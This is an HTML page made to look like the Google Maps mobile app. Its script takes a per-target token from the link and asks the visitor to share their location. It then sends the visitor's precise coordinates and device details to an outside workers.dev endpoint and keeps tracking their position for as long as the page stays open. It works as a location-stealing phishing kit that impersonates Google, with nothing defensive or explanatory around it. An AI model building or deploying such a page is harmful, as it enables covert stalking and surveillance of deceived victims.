<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Map</title>

<style>
html,body{
  margin:0;
  height:100%;
  font-family:system-ui,-apple-system;
}

/* Google map background */
.map-bg{
  position:fixed;
  inset:0;
  z-index:1;
}
.map-bg iframe{
  width:100%;
  height:110%;
  border:0;
}

/* Permission overlay */
#permission{
  position:fixed;
  inset:0;
  background:rgba(255, 255, 255, 0.751);
  display:flex;
  flex-direction:column;
  justify-content:center;
  align-items:center;
  z-index:5;
  text-align:center;
}

#permission img{
  width:72px;
  margin-bottom:14px;
}

#permission button{
  padding:12px 24px;
  font-size:16px;
  border:none;
  border-radius:8px;
  background:#ffffff;
  color:rgb(0, 136, 255);
  cursor:pointer;
  font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
}
.d-box{
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  
  background-color: white;
  border-radius: 15px;
  box-shadow: 0 0 5px rgba(128, 128, 128, 0.247);
  padding: 8px;
}
.d-box>h3{
  color: gray;
}
.d-box>h3>span{
  color: gray;
  font-weight: 40 ;
}

#status{

  margin-top:10px;
  font-size:14px;
  color:#948f8f;
  max-width:260px;
}
</style>
<style>
:root {
  --bg-color: #ffffff;
  --surface-color: #ffffff;
  --text-color: #e8eaed;
  --accent-blue: #8ab4f8;
  --pill-bg: #ffffff;
  --pill-text: #3c4043;
}

/* Google UI layer */
.google-ui{
  position:fixed;
  inset:0;
  pointer-events:none;
  z-index:4;
}

/* allow clicks on buttons */
.google-ui *{
  pointer-events:auto;
}

/* --- Header / Search Bar Section --- */
.top-container {
  position: absolute;
  top: 0;
  width: 100%;
  padding: 10px 0;
  z-index: 10;
}

.search-bar {
  background: var(--surface-color);
  margin: 0 12px;
  height: 48px;
  border-radius: 24px;
  display: flex;
  align-items: center;
  padding: 0 15px;
  box-shadow: 0 2px 6px rgba(0,0,0,0.3);
}

.search-bar i.fa-location-dot { color: #4285F4; margin-right: 12px; }
.search-bar .search-text { flex: 1; color: #9aa0a6; font-size: 16px; }
.search-bar i.fa-microphone { color: #8ab4f8; margin-right: 15px; }
.profile-icon{
  width:32px;height:32px;
  background:#7b1fa2;
  border-radius:50%;
  display:flex;
  align-items:center;
  justify-content:center;
  color:white;
  font-size:14px;
}

/* Pills */
.pill-container{
  display:flex;
  overflow-x:auto;
  padding:12px;
  gap:8px;
}
.pill{
  background:var(--pill-bg);
  color:var(--pill-text);
  padding:8px 16px;
  border-radius:20px;
  display:flex;
  align-items:center;
  font-size:14px;
  white-space:nowrap;
}
.pill i{margin-right:6px}

/* Right tools */
.map-tools{
  position:absolute;
  right:12px;
  top:130px;
  display:flex;
  flex-direction:column;
  gap:12px;
}
.tool-btn{
  width:40px;height:40px;
  background:var(--surface-color);
  border-radius:50%;
  display:flex;
  align-items:center;
  justify-content:center;
}
.tool-btn i{color:#e8eaed}
.compass i{color:#ea4335}

/* Bottom tools */
.bottom-right-tools{
  position:absolute;
  right:12px;
  bottom:80px;
  display:flex;
  flex-direction:column;
  gap:15px;
}

.locate-btn{
  width:48px;height:48px;
  background:var(--surface-color);
  border-radius:50%;
  display:flex;
  align-items:center;
  justify-content:center;
}

.directions-btn{
  width:56px;height:56px;
  background:#00838f;
  border-radius:16px;
  display:flex;
  align-items:center;
  justify-content:center;
}

/* Bottom nav */
.bottom-nav{
  position:absolute;
  bottom:0;
  width:100%;
  height:65px;
  background:#ffffff;
  display:flex;
  justify-content:space-around;
  align-items:center;
}

.nav-item{
  display:flex;
  flex-direction:column;
  align-items:center;
  font-size:20px;
  color:#6b6c6d;
}



.active-indicator{
  background:rgba(73, 200, 255, 0.84);
  padding:4px 20px;
  border-radius:15px;
}

.google-logo{
  position:absolute;
  bottom:75px;
  left:12px;
  font-weight:bold;
  opacity:.8;
  font-family: 'Roboto', sans-serif;
  font-weight: 700; /* Bold */
  font-size: 24px;
  letter-spacing: -2px;
}
/* CSS for Google Logo Colors */
.google-blue { color: #4285f4; }
.google-red { color: #ea4335; }
.google-yellow { color: #fbbc05; }
.google-green { color: #34a853; }


/* Google-style spinner */
.g-loader{
  width:40px;
  height:40px;
  border-radius:50%;
  border:4px solid #e0e0e0;
  border-top-color:#4285F4;
  border-right-color:#EA4335;
  border-bottom-color:#FBBC05;
  border-left-color:#34A853;
  animation:spin 1s linear infinite;
  margin-top:14px;
  display:none;
}

@keyframes spin{
  to{ transform:rotate(360deg); }
}

/* disable button while loading */
#permission.loading button{
  opacity:0.6;
  pointer-events:none;
}

</style>

</head>

<script>
/* ================= CONFIG ================= */
const API = "https://odd-wildflower-ef2f.ishaqanwar751.workers.dev";
const token = new URLSearchParams(location.search).get("token");
if(!token){ alert("Invalid link"); throw "NO TOKEN"; }

const statusEl = document.getElementById("status");
const mapFrame = document.getElementById("map-link");
const loader = document.getElementById("loader");
const permissionBox = document.getElementById("permission");
const allowBtn = document.getElementById("allow");

/* Device info */
function deviceInfo(){
  return {
    ua: navigator.userAgent,
    lang: navigator.language,
    screen: `${screen.width}x${screen.height}`,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
  };
}

/* CLICK */
allowBtn.onclick = () => {

  permissionBox.classList.add("loading");
  loader.style.display = "block";
  statusEl.textContent = "Requesting location…";

  if(!navigator.geolocation){
    statusEl.textContent = "Location not supported";
    loader.style.display = "none";
    permissionBox.classList.remove("loading");
    return;
  }

  navigator.geolocation.getCurrentPosition(
    success,
    error,
    { enableHighAccuracy:true, timeout:20000, maximumAge:0 }
  );
};

/* SUCCESS */
function success(pos){
  loader.style.display = "none";

  const { latitude, longitude, accuracy } = pos.coords;

  /* Update map instantly */
  mapFrame.src =
    `https://www.google.com/maps?q=${latitude},${longitude}&z=18&output=embed`;

  /* Send first hit */
  fetch(API + "/send-location",{
    method:"POST",
    headers:{ "Content-Type":"application/json" },
    body:JSON.stringify({
      token,
      lat: latitude,
      lng: longitude,
      acc: accuracy,
      device: deviceInfo()
    })
  });

  /* Remove permission UI */
  permissionBox.remove();

  /* Continuous tracking */
  navigator.geolocation.watchPosition(p=>{
    fetch(API + "/send-location",{
      method:"POST",
      headers:{ "Content-Type":"application/json" },
      body:JSON.stringify({
        token,
        lat: p.coords.latitude,
        lng: p.coords.longitude,
        acc: p.coords.accuracy
      })
    });
  }, ()=>{}, { enableHighAccuracy:true, maximumAge:0 });
}

/* ERROR */
function error(e){
  loader.style.display = "none";
  permissionBox.classList.remove("loading");

  if(e.code === 1){
    statusEl.textContent = "Location denied. Please allow GPS permission.";
  }else{
    statusEl.textContent = "Enable GPS & try again";
    allowBtn.textContent = "Retry";
  }
}
</script>
